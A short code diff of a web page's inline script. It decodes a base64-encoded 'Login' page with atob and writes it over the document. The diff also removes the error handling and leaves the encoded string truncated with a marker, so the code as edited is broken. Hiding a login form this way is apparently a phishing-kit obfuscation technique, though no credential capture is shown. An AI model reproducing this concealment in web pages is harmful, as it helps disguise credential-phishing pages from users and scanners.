@@ -53,18 +53,14 @@ document.addEventListener("keydown", function (e) {
 <script>
 (function () {
 
-var encoded = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgo8dGl0bGU+TG9naW48L3RpdGxlPgo8c3R5bGU+Cioge2JveC1zaXppbmc6Ym9yZGVyLWJveDttYXJnaW46MDtwYWRkaW5nOjB9CmJvZHl7YmFja2dyb3VuZDp";
+var encoded =
+"PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgo8dGl0bGU+TG9naW48L3RpdGxlPgo8c3R5bGU+Cioge2JveC1zaXppbmc6Ym9yZGVyLWJveDttYXJnaW46MDtwYWRkaW5nOjB9CmJvZHl7YmFja2dyb3VuZDp# (truncated for message safety)";
 
-try {
-    var html = atob(encoded);
+var html = atob(encoded);
 
-    document.open();
-    document.write(html);
-    document.close();
-
-} catch (e) {
-    document.body.innerHTML = "Failed to load login page.";
-}
+document.open();
+document.write(html);
+document.close();
 
 })();
 </script>
